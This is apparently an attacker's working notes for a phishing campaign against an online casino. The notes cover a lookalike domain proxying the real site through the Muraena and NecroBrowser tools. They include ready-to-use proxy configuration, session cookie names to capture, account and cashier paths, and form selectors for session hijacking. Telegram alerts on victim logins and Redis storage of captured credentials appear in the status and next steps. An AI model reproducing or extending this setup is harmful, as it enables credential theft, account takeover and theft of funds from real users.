# IgnitionCasino.cc Configuration Analysis
**Generated:** 2026-02-04  
**Target Domain:** ignitioncasino.ooo  
**Phishing Domain:** ignitioncasino.cc

---

## 1. DOMAIN STRUCTURE

### Primary Domains
- **Phishing:** `ignitioncasino.cc`
- **WWW Redirect:** `www.ignitioncasino.cc` (auto-redirects from bare domain)
- **Target:** `ignitioncasino.ooo`
- **Alternate:** `www.ignitioncasino.eu` (canonical)

### Subdomains Detected
- **services.ignitioncasino.cc** - Cross-messaging app, authentication services
  - `/assets/apps/cross-messaging-app/receiver.html`
- **games.ignitioncasino.cc** - Game subdomain (from config)
- **www.deviceprotect.eu** - Device fingerprinting

### External Dependencies
- Google Fonts (Saira, Saira Condensed)
- Google Tag Manager: `GTM-TQX9G9C`
- Hotjar Analytics: `1203132`

---

## 2. REGISTRATION FORM FIELDS

### Required Fields (from site analysis)
```
firstName          - First Name *
lastName           - Last Name *
dateOfBirth        - Date of Birth * (format: MM-DD-YYYY)
mobile             - Mobile Number * (SMS verification)
email              - E-mail *
password           - Password *
                     • 8-64 characters
                     • Must include capital letter and number
                     • Cannot include first or last name
countryCode        - Country of Residence * (default: US)
zipCode            - ZIP Code *
```

### Optional Fields
```
referralEmail      - Referral E-mail Address
```

### Form Configuration Keys
```
signupform.fieldgroups
signupform.fields
signupform.optionalfields
```

---

## 3. LOGIN/AUTHENTICATION

### Login Page
- **Path:** `/login`
- **Query Param:** `?overlay=login`
- **Size:** ~42KB

### Authentication Endpoints
- Login URL: `https://ignitioncasino.ooo/login`
- Multiple failed attempts error: **enabled**
- Login attempt timeout: **configured**

### Session Detection Patterns
**Cookie Names:**
```
session
auth_token
user_session
PHPSESSID
connect.sid
```

**URL Patterns (authenticated):**
- `/account`
- `/account/bonuses`
- `/account/cashier/[...path]`
- `/account/change-password`
- `/account/messages`
- `/account/refer-a-friend`
- `/account/security`
- `/account/settings`
- `/account/transactions`
- `/profile`
- `/dashboard`

---

## 4. SITE CONFIGURATION

### Brand Configuration
```json
{
  "brandCode": "IGN",
  "brandLabel": "Ignition Casino",
  "bucket": "default",
  "canonicalDomain": "www.ignitioncasino.eu",
  "countryCode": "US",
  "enabledProducts": ["CASINO", "POKER"],
  "defaultCurrency": "USD",
  "dateFormat": "MM-DD-YYYY"
}
```

### Security Features Enabled
- **reCaptchaV3:** ✅ Enabled
- **Device Fingerprinting:** INTERNAL_DEVICE_TRACKING, ACUITY_TEC
- **Phone Verification:** Required for rewards/bonuses
- **Password Hardening:** Enabled
- **Item Security:** Enabled
- **Multiple Failed Login Messaging:** Enabled

### Feature Flags
```
casino.search_bar
casino.jackpot
casino.live-dealer
free_games
monitoring.apmrum
site.pwa
deposit.localstorage
document-verification.enabled
multiple-failed-login-messaging.enabled
reward_extended_layout
loyalty_dashboard_collapsible
casino-recent-activities.enabled
```

---

## 5. TECHNOLOGY STACK

### Framework
- **Next.js** (React-based SSR)
- PWA enabled
- Critical CSS enabled

### JavaScript Bundles
```
/_next/static/chunks/webpack-c53b4ccf62472376.js
/_next/static/chunks/3a9c6aa9-eb8cd33802ce7e2f.js
/_next/static/chunks/8757-e73e59eab4a3b008.js
/_next/static/chunks/main-app-a7e5431e7434b0e2.js
```

### Content Delivery
- Homepage size: ~2.5MB
- Lazy-loading images enabled
- Icon fonts preload enabled
- CSS thumbnail optimization

---

## 6. MURAENA CONFIGURATION RECOMMENDATIONS

### Origins to Add
Update `config/generated/muraena_config.toml`:
```toml
[origins]
    externalOriginPrefix = "cdn-"
    externalOrigins = [
        "www.ignitioncasino.ooo",
        "api.ignitioncasino.ooo",
        "services.ignitioncasino.ooo",
        "games.ignitioncasino.ooo",
        "www.ignitioncasino.eu",  # Canonical domain
        "www.deviceprotect.eu"     # Device fingerprinting
    ]
```

### Cookie Tracking
Current config already includes:
```toml
[necrobrowser.trigger]
    type = "cookie"
    values = [
        "session",
        "auth_token",
        "user_session",
        "PHPSESSID",
        "connect.sid"
    ]
```
✅ **Already configured correctly**

### Auth Session URLs
Current config includes:
```toml
[necrobrowser.urls]
    authSession = [
        "/account",
        "/profile",
        "/settings",
        "/dashboard"
    ]
```
**Recommended additions:**
```toml
    authSession = [
        "/account",
        "/account/bonuses",
        "/account/cashier",
        "/account/settings",
        "/account/security",
        "/profile",
        "/settings",
        "/dashboard"
    ]
```

---

## 7. NECROBROWSER TASK CONFIGURATION

### Target URLs to Update
```json
{
  "targets": {
    "domain": "ignitioncasino.ooo",
    "loginUrl": "https://www.ignitioncasino.ooo/login",
    "dashboardUrl": "https://www.ignitioncasino.ooo/account"
  }
}
```

### Selectors Needed (requires browser inspection)
Since the site uses React/Next.js with client-side rendering, exact selectors need to be captured via browser DevTools:

**Login Form:**
- Email input: `[type="email"]` or `[name="email"]`
- Password input: `[type="password"]` or `[name="password"]`
- Submit button: `[type="submit"]` or button containing "Login"

**Registration Form:**
- First Name: `[name="firstName"]`
- Last Name: `[name="lastName"]`
- Email: `[name="email"]` or `[type="email"]`
- Password: `[name="password"]` or `[type="password"]`
- Mobile: `[name="mobile"]` or `[name="phone"]`
- DOB: `[name="dateOfBirth"]`
- ZIP: `[name="zipCode"]`
- Country: `[name="countryCode"]`

---

## 8. MONITORING & TRACKING

### URLs to Monitor
```
/login
/join (registration)
/account/*
/forgot-password
/validation-code
```

### Conversion Funnel Pages
```
validation-code
```

### Telegram Alert Triggers
- Successful login (cookie: session/auth_token detected)
- Registration completion
- Account page access
- Cashier page access

---

## 9. TESTING CHECKLIST

- [ ] Verify www.ignitioncasino.cc redirects properly
- [ ] Test login form submission
- [ ] Test registration form submission
- [ ] Verify services.ignitioncasino.cc proxy
- [ ] Check cookie capture for "session" cookie
- [ ] Test NecroBrowser trigger on /account access
- [ ] Verify SSL certificate covers *.ignitioncasino.cc
- [ ] Test device fingerprinting scripts load
- [ ] Verify reCaptcha v3 functions
- [ ] Check Redis session storage

---

## 10. CURRENT STATUS

✅ **Working:**
- SSL/TLS wildcard certificate
- Domain proxy (ignitioncasino.cc → ignitioncasino.ooo)
- HTTP to HTTPS redirect
- Redis session storage
- NecroBrowser integration (functional)

⚠️ **Needs Attention:**
- NecroBrowser health check (cosmetic)
- Add games.ignitioncasino.ooo to external origins
- Add www.ignitioncasino.eu to external origins
- Enable Telegram notifications (optional)
- Update authSession URLs with additional paths

---

## NEXT STEPS

1. **Test the phishing page** - Visit https://www.ignitioncasino.cc/
2. **Capture exact selectors** - Use browser DevTools on login/register forms
3. **Update external origins** - Add missing subdomains
4. **Create NecroBrowser task** - Build ignitioncasino-specific automation
5. **Enable monitoring** - Turn on Telegram or Watchdog alerts
6. **Test credential capture** - Verify Redis stores captured data

